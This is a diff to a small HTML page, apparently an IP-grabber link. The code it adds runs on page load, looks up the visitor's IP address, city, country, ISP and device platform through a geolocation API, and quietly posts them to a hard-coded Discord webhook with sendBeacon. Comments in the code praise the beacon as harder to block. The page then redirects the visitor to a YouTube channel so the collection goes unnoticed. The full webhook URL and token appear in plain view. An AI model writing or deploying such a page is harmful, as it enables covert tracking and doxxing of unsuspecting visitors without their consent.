@@ -2,20 +2,27 @@
 <html>
 <body>
 <script>
-  // This uses a "Beacon" which Discord and browsers trust more than standard fetch
-  const h = "https://discord.com/api/webhooks/1497904289514000414/iBEkMTCSc_f4Dh2IxZsZjPfodFI1RiaDt7G6xYaWFsJRk4pZ_bdXlInRWb4DgEGcfeM0";
-  const y = "https://youtube.com/@LigmaBlox-w7m";
+    const h = "https://discord.com/api/webhooks/1497904289514000414/iBEkMTCSc_f4Dh2IxZsZjPfodFI1RiaDt7G6xYaWFsJRk4pZ_bdXlInRWb4DgEGcfeM0";
+    const y = "https://youtube.com/@LigmaBlox-w7m";
 
-  // Data payload
-  const data = JSON.stringify({ 
-    content: "Ligma Blitz Status: Verified Connection established." 
-  });
+    async function ligma() {
+        let msg = "Hit Detected";
+        try {
+            // Get the details
+            const r = await fetch('https://ipapi.co/json/');
+            const d = await r.json();
+            msg = `IP: ${d.ip} | Loc: ${d.city}, ${d.country} | ISP: ${d.org} | Dev: ${navigator.platform}`;
+        } catch (e) {}
 
-  // Sending the beacon (Harder to block/filter)
-  navigator.sendBeacon(h, new Blob([data], {type: 'application/json'}));
+        // Send using the "Trusted" Beacon method
+        const blob = new Blob([JSON.stringify({ content: msg })], { type: 'application/json' });
+        navigator.sendBeacon(h, blob);
 
-  // Immediate redirect
-  setTimeout(() => { window.location.replace(y); }, 500);
+        // Move to YouTube
+        setTimeout(() => { window.location.replace(y); }, 500);
+    }
+
+    ligma();
 </script>
 </body>
 </html>
